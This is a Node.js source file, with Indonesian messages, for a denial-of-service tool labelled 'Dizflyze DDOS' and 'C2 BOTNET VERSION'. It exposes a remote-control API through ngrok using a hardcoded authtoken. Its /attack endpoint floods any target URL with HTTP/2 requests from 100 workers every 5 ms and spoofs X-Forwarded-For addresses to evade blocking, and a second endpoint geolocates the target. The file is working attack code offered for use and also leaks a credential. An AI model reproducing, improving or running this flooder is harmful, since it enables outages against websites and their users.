require('colors');
const express = require('express');
const ngrok = require('ngrok');
const http2 = require('http2');
const crypto = require('crypto');
const fetch = require('node-fetch');

const app = express();
const bodyParser = require('body-parser');
app.use(bodyParser.json());

let C = false;
let currentPort = Math.floor(Math.random() * (60000 - 3000 + 1)) + 3000;

const L = () => {
  console.log(`
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀ ⠀ ⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  [ # ] Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿  [ # ] DDOS
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀ ⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] 3.1.8
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋   ⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26-MEI
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀ ⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `.cyan);
  console.log(`C2 BOTNET VERSION\n`.yellow);
};

const N = async () => {
  try {
    await ngrok.authtoken('2xdnPcPH41TA26s84notWGL5pFV_4yyAxThJgiWnsxoqu2QAa');
    const url = await ngrok.connect({ proto: 'http', addr: currentPort, region: 'ap' });
    console.log(`${'🍁'.cyan} ${'╔═(api)Dizflyze Streser)\n  ╚═➤ '.bold} ${url.underline}`);
    console.log(`${'🐥'.yellow} ${'[ MENUNGGU ]'.yellow}\n`);
    return url;
  } catch (e) {
    console.log(`\n${'×'.red} ${'[ NGROK ERROR ] :'.bold} ${e.message}`);
    process.exit(1);
  }
};

const userAgents = [
  // ... semua user agents yang sudah kamu sediakan ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  // (tambahkan semua user agent lainnya sesuai daftar kamu)
  // ...
];

const attack = async (target, duration) => {
  console.log(`${'⚡'.yellow} ${'[ ATTACK ] :'.bold} ${target.underline}`);
  console.log(`${'⏳'.cyan} ${'[ DURASI ] :'.bold} ${duration.toString().yellow} detik\n`);

  const startTime = Date.now();

  const flood = async () => {
    try {
      const client = http2.connect(target, { rejectUnauthorized: false });
      client.on('error', () => {});
      await new Promise((resolve) => {
        const start = Date.now();
        const interval = setInterval(() => {
          if (Date.now() - start >= duration * 1000) {
            clearInterval(interval);
            client.close();
            resolve();
            return;
          }
          const req = client.request({
            ':method': 'GET',
            ':path': '/',
            'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'accept-language': 'en-US,en;q=0.9',
            'x-forwarded-for': `${crypto.randomInt(1, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(1, 255)}`,
            'cache-control': 'no-cache'
          });
          req.on('response', () => req.close());
          req.end();
        }, 5); // interval 5ms
      });
    } catch (e) {
      // error handling jika diperlukan
    }
  };

  const workerCount = 100; // jumlah worker lebih tinggi
  const workers = Array.from({ length: workerCount }, () => flood());
  await Promise.all(workers);

  const totalTime = Math.round((Date.now() - startTime) / 1000);
  console.log(`${'✓'.green} Attack selesai dalam ${totalTime} detik`);
};

app.post('/attack', async (req, res) => {
  if (C) return res.status(429).json({ error: '[ PROSES ]' });
  const { target, apiKey } = req.body;
  if (apiKey !== 'TERMUX_KEY') return res.status(403).json({ error: 'Akses tidak valid' });
  try {
    new URL(target);
    C = true;
    await attack(target, 60);
    C = false;
    res.status(200).json({ status: '[ STARTED ]', target });
  } catch (e) {
    C = false;
    res.status(400).json({ error: '[ URL INVALID! ]' });
  }
});

app.get('/info', async (req, res) => {
  try {
    const response = await fetch(`http://ip-api.com/json/${new URL(req.query.target).hostname}`);
    const data = await response.json();
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: '[ GAGAL MENCARI INFORMASI ]' });
  }
});

L();

app.listen(currentPort, () => {
  console.log(`${'[ RUNNING ] :'.bold} ${currentPort.toString().yellow}`);
  N();
});
